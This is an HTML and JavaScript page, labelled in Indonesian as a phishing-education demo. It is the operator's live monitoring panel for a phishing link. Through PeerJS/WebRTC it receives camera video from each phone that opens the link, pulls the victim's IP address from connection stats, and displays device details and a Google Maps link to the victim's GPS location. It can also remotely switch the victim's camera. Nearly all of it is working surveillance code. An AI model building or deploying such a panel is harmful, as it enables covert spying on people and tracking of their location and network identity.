<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Panel Monitoring Multi-Target (Edukasi Phishing)</title>
  <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
  <style>
    body { font-family: sans-serif; background: #121212; color: white; padding: 20px; margin: 0; }
    h1 { text-align: center; color: #00ffcc; margin-bottom: 5px; }
    p.sub { text-align: center; color: #aaa; margin-top: 0; margin-bottom: 25px; }
    .grid-container { display: grid; grid-template-columns: repeat(auto-fit, minmax(340px, 1fr)); gap: 20px; padding: 10px; }
    .target-card { background: #1e1e1e; border: 2px solid #333; border-radius: 12px; padding: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); display: flex; flex-direction: column; align-items: center; }
    .target-card.active { border-color: #00ffcc; }
    video { width: 100%; height: 240px; background: #000; border-radius: 8px; object-fit: cover; margin-bottom: 12px; border: 1px solid #444; }
    .info-box { background: #2a2a2a; width: 100%; padding: 12px; border-radius: 6px; box-sizing: border-box; font-family: monospace; font-size: 13px; color: #00ffcc; line-height: 1.5; text-align: left; margin-bottom: 12px; word-break: break-all; }
    button { width: 100%; padding: 10px; font-size: 14px; background: #007bff; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
    button:hover { background: #0056b3; }
    .btn-maps { display: block; margin-top: 8px; padding: 8px; background: #28a745; color: white; text-align: center; border-radius: 6px; text-decoration: none; font-weight: bold; font-family: sans-serif; font-size: 13px; }
    .btn-maps:hover { background: #218838; }
    #noTarget { text-align: center; font-size: 18px; color: #888; grid-column: 1 / -1; margin-top: 40px; }
  </style>
</head>
<body>
  <h1>Layar Monitoring Multi-Target (Live)</h1>
  <p class="sub">Setiap HP yang mengklik tautan akan otomatis muncul dalam panel independen di bawah ini.</p>
  
  <div class="grid-container" id="gridContainer">
    <div id="noTarget">Menunggu koneksi HP target... (Pastikan HP mengklik tautan & mengizinkan kamera)</div>
  </div>

  <script>
    const ID_LAPTOP = "guru-demo-kamera-123";

    const peer = new Peer(ID_LAPTOP, {
      config: {
        iceServers: [
          { urls: 'stun:stun.l.google.com:19302' },
          { urls: 'stun:stun1.l.google.com:19302' },
          { urls: 'stun:stun2.l.google.com:19302' }
        ]
      }
    });

    const connectedDevices = {};

    peer.on('open', (id) => {
      console.log('Panel Guru Siap. ID Server:', id);
    });

    peer.on('connection', (conn) => {
      const peerId = conn.peer;
      
      if (!connectedDevices[peerId]) {
        connectedDevices[peerId] = { dataConn: conn, deviceInfo: null, locationInfo: null };
        buatKartuTarget(peerId);
      } else {
        connectedDevices[peerId].dataConn = conn;
      }

      conn.on('data', (data) => {
        const targetPeerId = data.peerId || peerId;
        if (!connectedDevices[targetPeerId]) {
          buatKartuTarget(targetPeerId);
        }

        if (data.type === 'device-info') {
          connectedDevices[targetPeerId].deviceInfo = data;
          perbaruiTampilanKartu(targetPeerId);
        }

        if (data.type === 'location-info') {
          connectedDevices[targetPeerId].locationInfo = data;
          perbaruiTampilanKartu(targetPeerId);
        }
      });
    });

    peer.on('call', (call) => {
      const peerId = call.peer;
      call.answer();

      call.on('stream', (remoteStream) => {
        if (!connectedDevices[peerId]) {
          buatKartuTarget(peerId);
        }

        const videoEl = document.getElementById(`video-${peerId}`);
        if (videoEl) {
          videoEl.srcObject = remoteStream;
          videoEl.play().catch(err => console.warn("Autoplay dipblokir:", err));
        }

        setTimeout(() => {
          if (call.peerConnection) {
            call.peerConnection.getStats().then(stats => {
              stats.forEach(report => {
                if (report.type === 'remote-candidate' && report.ip) {
                  connectedDevices[peerId].ipInfo = `${report.ip}:${report.port} (${report.candidateType})`;
                  perbaruiTampilanKartu(peerId);
                }
              });
            });
          }
        }, 1000);
      });
    });

    function buatKartuTarget(peerId) {
      const noTargetEl = document.getElementById('noTarget');
      if (noTargetEl) noTargetEl.style.display = 'none';

      const grid = document.getElementById('gridContainer');
      if (document.getElementById(`card-${peerId}`)) return;

      const card = document.createElement('div');
      card.className = 'target-card active';
      card.id = `card-${peerId}`;

      card.innerHTML = `
        <h3>📱 Target ID: ${peerId.substring(0, 8)}...</h3>
        <video id="video-${peerId}" autoplay playsinline muted></video>
        <div class="info-box" id="info-${peerId}">Menunggu data perangkat...</div>
        <button onclick="gantiKameraTarget('${peerId}')">🔄 Ganti Kamera Target Ini</button>
      `;

      grid.appendChild(card);
    }

    function perbaruiTampilanKartu(peerId) {
      const infoEl = document.getElementById(`info-${peerId}`);
      if (!infoEl) return;

      const dev = connectedDevices[peerId];
      let html = `<strong>🌐 IP:</strong> ${dev.ipInfo || 'Mencari...'}<br><br>`;

      if (dev.deviceInfo) {
        html += `
          <strong>📱 Perangkat:</strong><br>
          • OS/Browser: ${dev.deviceInfo.osBrowser.substring(0, 40)}...<br>
          • Layar: ${dev.deviceInfo.resolusi}<br>
          • Hardware: ${dev.deviceInfo.cpuCore} Core | RAM ${dev.deviceInfo.ram}<br>
          • Zona Waktu: ${dev.deviceInfo.zonaWaktu}<br>
        `;
      } else {
        html += `• Memuat info perangkat...<br>`;
      }

      if (dev.locationInfo) {
        html += `
          <a href="${dev.locationInfo.mapsUrl}" target="_blank" class="btn-maps">
            🗺️ Buka Lokasi Google Maps
          </a>
        `;
      } else {
        html += `<br><span style="color:#888;">(Menunggu izin lokasi GPS...)</span>`;
      }

      infoEl.innerHTML = html;
    }

    function gantiKameraTarget(peerId) {
      const dev = connectedDevices[peerId];
      if (dev && dev.dataConn && dev.dataConn.open) {
        dev.dataConn.send('switch');
      } else {
        alert("Koneksi data ke HP ini terputus!");
      }
    }
  </script>
</body>
</html>
